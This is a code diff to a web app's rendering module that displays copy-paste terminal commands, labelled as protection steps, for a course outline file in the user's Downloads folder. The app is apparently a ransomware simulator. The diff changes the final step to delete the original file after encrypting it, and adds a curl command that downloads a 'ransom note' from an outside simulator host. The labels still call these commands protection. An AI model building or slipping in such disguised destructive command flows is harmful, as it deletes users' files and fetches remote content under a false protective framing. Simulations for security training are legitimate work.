@@ -54,7 +54,7 @@ export function renderEncryption(container, state, actions) {
         </div>
       </div>
 
-      ${values.checkCommand && values.protectCommands?.length === 3 ? `
+      ${values.checkCommand && values.protectCommands?.length === 4 ? `
         <div class="cyber-panel mt-3 animate-fade-in">
           <div class="panel-header">
             <div class="panel-title">
@@ -77,10 +77,11 @@ export function renderEncryption(container, state, actions) {
               <div class="folder-field-label mt-2">${index + 2}. ${[
                 'Encrypt to a temporary file',
                 'Verify the temporary file',
-                'Create the final encrypted copy'
+                'Remove the original file',
+                'Download the simulated ransom note'
               ][index]}</div>
               <div class="code-copy-row">
-                <textarea id="protect-command-${index}" class="cyber-textarea font-mono" rows="${index === 1 ? 2 : 3}" readonly aria-label="Protection command ${index + 1}">${escapeHtml(command)}</textarea>
+                <textarea id="protect-command-${index}" class="cyber-textarea font-mono" rows="${index === 1 || index === 3 ? 2 : 3}" readonly aria-label="Protection command ${index + 1}">${escapeHtml(command)}</textarea>
                 <button type="button" class="btn-primary-confirm copy-command-btn" data-copy-target="protect-command-${index}">Copy</button>
               </div>
             `).join('')}
@@ -164,13 +165,15 @@ function buildTerminalCommands(password) {
   const secret = shellQuote(password);
   const input = `"$HOME/Downloads/${COURSE_OUTLINE_FILE}"`;
   const temporaryOutput = `"$HOME/Downloads/${COURSE_OUTLINE_FILE}.enc"`;
+  const ransomNoteOutput = '"$HOME/Downloads/ransomnote.txt"';
 
   return {
     checkCommand: 'openssl version',
     protectCommands: [
   `openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:${secret} -in ${input} -out ${temporaryOutput}`,
   `test -s ${temporaryOutput} || { rm -f ${temporaryOutput}; echo "ENCRYPTION FAILED"; exit 1; }`,
-  `rm -f ${input}`
+  `rm -f ${input}`,
+  `curl -fL 'https://ransomware-simulator-self.vercel.app/ransomnote.txt' -o ${ransomNoteOutput}`
 ]
   };
 }
